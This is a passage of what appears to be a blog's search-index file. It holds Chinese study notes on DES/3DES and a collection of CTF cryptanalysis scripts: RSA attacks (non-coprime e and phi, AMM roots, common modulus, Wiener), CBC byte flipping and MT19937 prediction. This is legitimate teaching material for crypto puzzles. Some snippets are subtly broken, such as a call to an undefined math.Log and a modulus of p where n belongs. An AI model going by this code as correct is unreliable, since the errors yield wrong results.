class="line">ciphertext = cipher.encrypt(message) #加密</span><br><span class="line">print(ciphertext)</span><br><span class="line">plain = cipher.decrypt(ciphertext) #解密</span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure><h2 id="des">3DES</h2><p>由于DES的实际密钥长度只有56位，安全性并不高，于是便有了3DES，可以说是对明文进行了3次DES，因此密钥有168位。</p><p>流程如下（图来源<ahref="https://blog.csdn.net/qq_41137136/article/details/86416849">这篇文章</a>）</p><h3 id="des-ede3">DES-EDE3</h3><p>三个密钥都不同时</p><figure><img src="/images/DES加密/2019011314264658.png"alt="2019011314264658" /><figcaption aria-hidden="true">2019011314264658</figcaption></figure><h3 id="des-ede2">DES-EDE2</h3><p>当密钥1、3相同，密钥2不同时</p><figure><img src="/images/DES加密/20190113142411607.png"alt="20190113142411607" /><figcaption aria-hidden="true">20190113142411607</figcaption></figure><p>当三个密钥都相同时，就成了普通的DES</p><h2 id="关于des的攻击">关于DES的攻击</h2><blockquote><p>这里有待补充</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HSCCTF2024 Writeup</title>
      <link href="/2024/03/10/HSCCTF2024-Writeup/"/>
      <url>/2024/03/10/HSCCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup"><ahref="https://www.blog.st4rr.top/writeups/HSCCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> HSCCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学算法散记</title>
      <link href="/2024/03/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%97%E6%B3%95%E6%95%A3%E8%AE%B0/"/>
      <url>/2024/03/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%97%E6%B3%95%E6%95%A3%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这里零散地记载一些密码学可能用到的算法脚本<del>（当裁缝）</del>，方便之后直接拿来用</p></blockquote><h2 id="rsa中的ephi不互素问题">RSA中的e,phi不互素问题</h2><p>参考了<ahref="https://blog.csdn.net/m0_74345946/article/details/133936371">这篇文章</a></p><h3 id="换模">换模</h3><p>当e和p-1或q-1互素时，可以转换到模p或模q下求解</p><p>假设e与p-1互素 <span class="math display">\[m^e\equiv c(mod\ n)\]</span></p><p><span class="math display">\[m^e=c+kpq\]</span></p><p><span class="math display">\[m^e\ mod\ p=c\ mod\ p+kpq\ mod\ p\]</span></p><p><span class="math display">\[m^e\equiv c(mod\ p)\]</span></p><p>python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=</span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">n=</span><br><span class="line">c=</span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(e,p-<span class="number">1</span>)==<span class="number">1</span></span><br><span class="line">c=c%p</span><br><span class="line">phi=p-<span class="number">1</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,p)</span><br></pre></td></tr></table></figure><h3 id="egcd-irootm2">e//gcd iroot(m,2)</h3><p>当gcd(e,phi)较小时，可以先将e//gcd(e,phi)，使得e和phi互素后，再对算出的m开根</p><p>python实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e=</span><br><span class="line">p=</span><br><span class="line">q=</span><br><span class="line">n=</span><br><span class="line">c=</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">_gcd=gmpy2.gcd(e,phi)</span><br><span class="line">e=e//_gcd</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=gmpy2.iroot(<span class="built_in">pow</span>(c,d,p),_gcd)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3 id="有限域内开方">有限域内开方</h3><p>有时，当e较小时，我们仍然无法用上面的方法得到m。这时，我们可以使用有限域内开方的方法。</p><p>前面我们已经证明了，当p为素数时，由 <span class="math display">\[m^e\equiv c(mod\ n)\]</span> 可以推知 <span class="math display">\[m^e\equiv c(mod\ p)\]</span> 于是我们可以设法找到所有满足 <span class="math display">\[m^e\equiv x^e\equiv c(mod\ p)\]</span> 的x，以及所有满足 <span class="math display">\[m^e\equiv y^e\equiv c(mod\ q)\]</span> 的y，从而列出 <span class="math display">\[\begin{cases}m\equiv x(mod\ p) \\ m\equiv y(mod\ q)\end{cases}\]</span> 的方程组，通过中国剩余定理（CRT）求解。</p><p>下面是一个利用sagemath的程序实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">c = </span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^e-c</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^e-c</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q])</span><br><span class="line">        flag.append(solution)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    m=long_to_bytes(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span><span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然也可以通过观察对算法进行一定的优化，详见上面给出的文章，这里不再赘述。</p><h3 id="amm算法">AMM算法</h3><p>参考了<ahref="https://lov2.netlify.app/rsa_e_phi_not_coprime/">这篇文章</a></p><p>当e比较大的时候，我们可以使用AMM算法，它能够大大提高运算的速度</p><h4 id="原算法">原算法</h4><p>先说明一下AMM算法的原算法，此时e=2，p为奇素数，对于 <spanclass="math display">\[x^2\equiv r(mod\ p)\]</span> 我们先对两边开根 <span class="math display">\[x\equiv r^{\frac{1}{2}}(mod\ p)\]</span> 令p-1=2^{s}t，又由欧拉定理得， <span class="math display">\[r^{\frac{p-1}{2}}\equiv r^{2^{s-1}t}\equiv 1(mod\ p)\]</span></p><h5 id="当s1时">当s=1时，</h5><p><span class="math display">\[r^t\equiv 1(mod\ p)\]</span></p><p>两边同时乘r，再开根，即推出公式 <span class="math display">\[r^{\frac{t+1}{2}}\equiv \pm \sqrt r\equiv \pm x(mod\ p)\]</span> 将m和c代进去，就是这样(t可以根据p算出来) <spanclass="math display">\[\pm m\equiv c^{\frac{t+1}{2}}\]</span></p><h5 id="当s1时-1">当s&gt;1时，</h5><p>如果直接开根我们会得到一正一负两个式子 <span class="math display">\[r^{2^{s-2}t}\equiv 1(mod\ p)\]</span></p><p><span class="math display">\[r^{2^{s-2}t}\equiv -1(mod\ p)\]</span></p><p>由上面得到的 <span class="math display">\[r^{2^{s-1}t}\equiv 1(mod\ p)\]</span> 两边同时乘上这个式子，并用k来控制是否要乘（k=0,1） <spanclass="math display">\[r^{2^{s-2}t}n^{2^{s-1}tk}\equiv 1(mod\ p)\]</span> 就这样反复对两边进行开方操作，直至回到前面s=1的情况，即 <spanclass="math display">\[r^tn^{t*(2k_1+2^2k_2+...+2^{s-1}k_{s-1})}\equiv 1(mod\ p)\]</span> 两边乘上r再开方 <span class="math display">\[r^{\frac{t+1}{2}}n^{t*(k_1+2k_2+...+2^{s-2}k_{s-1})}\equiv\pm  \sqrtr\equiv \pm x(mod\ p)\]</span> 将m和c代进去，得到 <span class="math display">\[c^{\frac{t+1}{2}}n^{t*(k_1+2k_2+...+2^{s-2}k_{s-1})}\equiv \pm m(mod\ p)\]</span></p><h4 id="e2">e&gt;2</h4><p>对于 <span class="math display">\[x^e\equiv r(mod\ p)\]</span> 令p-1=e^{s}t，则有 <span class="math display">\[r^{\frac{p-1}{e}}\equiv r^{e^{s-1}t}\equiv 1(mod\ p)\]</span> 此时可以找到δ，使得t|(eδ-1)，则 <span class="math display">\[r^{e^{s-1}(eδ-1)}\equiv 1(mod\ p)\]</span></p><h5 id="当s1时-2">当s=1时，</h5><p><span class="math display">\[r^{(eδ-1)}\equiv 1(mod\ p)\]</span></p><p>两边乘r，再开e次方 <span class="math display">\[r^\delta\equiv r^{\frac{1}{e}}\equiv x(mod\ p)\]</span></p><h5 id="当s1时-3">当s&gt;1时，</h5><p>构造e次非剩余集合 <span class="math display">\[K_i=\rho^{i*\frac{p-1}{e}}=\rho^{i*e^{s-1}t},0\leq i\leq e-1\]</span></p><p><span class="math display">\[K_i^e=\rho^{i*e^st}=\rho^{i*(p-1)}\]</span></p><p>所以根据欧拉定理，得 <span class="math display">\[\rho^{i*(p-1)}\equiv \rho^{(p-1)}\equiv1(mod\ p)\]</span> 由上面的式子又可以推知 <span class="math display">\[\begin{cases}K_i=\rho^{\frac{i*(p-1)}{e}} \\K_{e-i}=\rho^{\frac{(e-i)*(p-1)}{e}}\end{cases}\]</span></p><p><span class="math display">\[K_i*K_{e-i}=\rho^{p-1}\]</span> 由欧拉定理又可以得到 <span class="math display">\[K_i*K_{e-i}\equiv 1(mod\ p)\]</span> 所以K_i和K_{e-i}互为逆元</p><p>对于前面这个式子 <span class="math display">\[r^{e^{s-1}(eδ-1)}\equiv 1(mod\ p)\]</span> 两边开e次方得到一个集合K中的数设为K_{e-j} <spanclass="math display">\[r^{e^{s-2}(eδ-1)}\equiv K_{e-j}(mod\ p)\]</span> 两边乘上K_j然后开e次方 <span class="math display">\[r^{e^{s-2}(eδ-1)}K_j\equiv K_{e-j}K_j\equiv 1(mod\ p)\]</span></p><p><span class="math display">\[r^{e^{s-2}(eδ-1)}\rho^{j*e^{s-1}t}\equiv 1(mod\ p)\]</span></p><p>反复进行上述操作，直至回到s=1的情况 <span class="math display">\[r^{(eδ-1)}\rho^{ej_1+e^2j_2+...+e^{s-1}j_{s-1}}\equiv 1(mod\ p)\]</span> 两边乘r，开e次方 <span class="math display">\[r^δ\rho^{j_1+ej_2+...+e^{s-2}j_{s-1}}\equiv r^{\frac{1}{e}}\equiv x(mod\p)\]</span> 将m和c代进去，得到 <span class="math display">\[c^δ\rho^{j_1+ej_2+...+e^{s-2}j_{s-1}}\equiv m(mod\ p)\]</span>此时我们便得到了其中一个根，剩余的根可以通过不断乘上集合K得到.</p><p>当我们得到了所有的解以后，使用中国剩余定理对下面的方程组求解即可<span class="math display">\[\begin{cases} m^e\equiv cp(mod\ p) \\ m^e\equiv cq(mod\ q)\end{cases}\]</span> python代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * <span class="comment"># pip install pycryptodome</span></span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="comment"># pip install gmpy2</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm <span class="comment"># pip install tqdm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">onemod</span>(<span class="params">e, q</span>):</span><br><span class="line">    p = random.randint(<span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> ((gmpy2.powmod(p, (q - <span class="number">1</span>) // e, q)) == <span class="number">1</span>):</span><br><span class="line">        p = random.randint(<span class="number">1</span>, q)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM_rth</span>(<span class="params">x, e, N</span>):</span><br><span class="line">    <span class="keyword">assert</span> ((N - <span class="number">1</span>) % e == <span class="number">0</span>)</span><br><span class="line">    p = onemod(e, N)</span><br><span class="line">    </span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = N - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (s % e == <span class="number">0</span>):</span><br><span class="line">        s = s // e</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((s * k + <span class="number">1</span>) % e != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    delta = (s * k + <span class="number">1</span>) // e</span><br><span class="line"></span><br><span class="line">    a = gmpy2.powmod(p, e ** (t - <span class="number">1</span>) * s, N)</span><br><span class="line">    b = gmpy2.powmod(x, e * delta - <span class="number">1</span>, N)</span><br><span class="line">    c = gmpy2.powmod(p, s ,N)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>, t)):</span><br><span class="line">        d = gmpy2.powmod(b, e ** (t - <span class="number">1</span> -i), N)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = (- math.Log(d, a)) % e</span><br><span class="line">        b = b * (c ** (e ** j)) % N</span><br><span class="line">        h = h * (c ** j) % N</span><br><span class="line">        c = c ** e % N</span><br><span class="line">    result = gmpy2.powmod(x, delta, N) * h</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_ROOT2</span>(<span class="params">r, q</span>):  </span><br><span class="line">    list1 = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(list1) &lt; r):</span><br><span class="line">        p = gmpy2.powmod(random.randint(<span class="number">1</span>, q - <span class="number">1</span>), (q - <span class="number">1</span>) // r, q)</span><br><span class="line">        list1.add(p)</span><br><span class="line">    <span class="keyword">return</span> list1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_Solution</span>(<span class="params">m, q, rt, cq, e</span>):</span><br><span class="line">    mp = []</span><br><span class="line">    <span class="keyword">for</span> pr <span class="keyword">in</span> rt:</span><br><span class="line">        r = (pr * m) % q</span><br><span class="line">        mp.append(r)</span><br><span class="line">    <span class="keyword">return</span> mp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">mp, mq, e, p, q</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    t1 = gmpy2.invert(q, p)</span><br><span class="line">    t2 = gmpy2.invert(p, q)</span><br><span class="line">    <span class="keyword">for</span> mp1 <span class="keyword">in</span> mp:</span><br><span class="line">        <span class="keyword">for</span> mq1 <span class="keyword">in</span> mq:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j % <span class="number">100000</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">            ans = (mp1 * t1 * q + mq1 * t2 * p) % (p * q)</span><br><span class="line">            <span class="keyword">if</span> check(ans):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> flag_info <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = </span><br><span class="line">flag_info = <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line"></span><br><span class="line">mp = AMM_rth(cp, e, p)</span><br><span class="line">mq = AMM_rth(cq, e, q)</span><br><span class="line"></span><br><span class="line">rt1 = ALL_ROOT2(e, p)  </span><br><span class="line">rt2 = ALL_ROOT2(e, q)</span><br><span class="line"></span><br><span class="line">amp = ALL_Solution(mp, p, rt1, cp, e)  </span><br><span class="line">amq = ALL_Solution(mq, q, rt2, cq, e)</span><br><span class="line"></span><br><span class="line">calc(amp, amq, e, p, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;run over&quot;</span>)</span><br></pre></td></tr></table></figure><p>当然，这里还得介绍一下sagemath中有一个很好用的方法.nth_root，可以非常有效地完成域下的高次开根</p><p>大概用法如下，可视情况做出修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">K=Zmod(n)</span><br><span class="line">x=K(c).nth_root(e,<span class="built_in">all</span>=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这样可以返回所有在模n整数环下，满足x^e ≡ c (mod n)的x</p><h2 id="共模攻击">共模攻击</h2><p>用于解决在GF(n)下，明文相同，公钥不同，而模n又很大难以分解的情况（两组公钥和密文已知）<span class="math display">\[\begin{cases}m^{e_1}\equiv c_1(mod\ n) \\ m^{e_2}\equiv c_2(mod\n)\end{cases}\]</span> 两边分别同时乘s1,s2次方 <span class="math display">\[\begin{cases}m^{e_1s_1}\equiv c_1^{s_1}(mod\ n) \\ m^{e_2s_2}\equivc_2^{s_2}(mod\ n)\end{cases}\]</span> 两式相乘 <span class="math display">\[m^{e_1s_1+e_2s_2}\equiv c_1^{s_1}c_2^{s_2}(mod\ n)\]</span>这里使用扩展欧几里得算法，我们可以找到能满足e1s1+e2s2=1的s1和s2。又因为一般来说m&lt;n，所以<span class="math display">\[m=c_1^{s_1}c_2^{s_2}\ mod\ n\]</span> 代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=</span><br><span class="line">e1=</span><br><span class="line">e2=</span><br><span class="line">c1=</span><br><span class="line">c2=</span><br><span class="line">_gcd,s1,s2=gmpy2.gcdext(e1,e2)</span><br><span class="line">m=<span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n)%n</span><br></pre></td></tr></table></figure><h2 id="维纳攻击">维纳攻击</h2><p>参考<ahref="https://blog.csdn.net/XiongSiqi_blog/article/details/130515028">这篇文章</a></p><p>用于RSA中e很大的时候</p><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>):</span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    numerator = <span class="number">0</span></span><br><span class="line">    denominator = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cf[::-<span class="number">1</span>]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    <span class="keyword">return</span> numerator, denominator</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getGradualFra</span>(<span class="params">cf</span>):</span><br><span class="line">    gf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(cf) + <span class="number">1</span>):</span><br><span class="line">        gf.append(gradualFra(cf[:i]))</span><br><span class="line">    <span class="keyword">return</span> gf</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    cf = continuedFra(e, n)</span><br><span class="line">    gf = getGradualFra(cf)</span><br><span class="line">    <span class="keyword">for</span> d, k <span class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">n=</span><br><span class="line">e=</span><br><span class="line">c=</span><br><span class="line">d=wienerAttack(e, n)</span><br><span class="line">m=<span class="built_in">pow</span>(c, d, n)</span><br></pre></td></tr></table></figure><h2 id="cbc字节翻转攻击">CBC字节翻转攻击</h2><p>参考<ahref="https://blog.csdn.net/xiongsiqi_blog/article/details/131925246">这篇文章</a></p><p>用于CBC模式下的AES加密</p><p>个人认为上面的文章中这一段讲得已经很清楚了</p><figure><img src="/images/密码学算法散记/image-20240721165239569.png"alt="image-20240721165239569" /><figcaption aria-hidden="true">image-20240721165239569</figcaption></figure><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a1, a2</span>): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([b1 ^ b2 <span class="keyword">for</span> b1,b2 <span class="keyword">in</span> <span class="built_in">zip</span>(a1,a2)])</span><br><span class="line">A=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">C=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">CC=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">AA=strxor(A,C)</span><br><span class="line">AA=strxor(AA,CC)</span><br><span class="line"><span class="built_in">print</span>(AA)</span><br></pre></td></tr></table></figure><h2 id="mt19937伪随机数预测">MT19937伪随机数预测</h2><p>MT19937，即梅森旋转算法，是一种伪随机数的生成算法，python中的random模块生成“随机数”时使用的就是这种算法。</p><p>根据其原理，有一个叫randcrack的python模块可以对其生成的“随机数”进行预测，前提是需要已知已经生成的至少624个32位二进制数，这样才能预测出下一个生成的数会是多少。</p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line">rc = RandCrack()</span><br><span class="line">Rand=[] <span class="comment">#624个32位二进制数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    rc.submit(Rand[i])</span><br><span class="line">pre=rc.predict_getrandbits(<span class="number">100</span>) <span class="comment">#假设要预测的是下一个100位二进制数</span></span><br><span class="line"><span class="built_in">print</span>(pre)</span><br></pre></td></tr></table></figure><p>那么前面给出的是312个64位数呢？</p><p>其实，random生成64位数的方式就是先生成2个32位数，然后将它们拼起来得到的。因此我们只需要把这个64位数拆开成两个32位数即可。</p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack 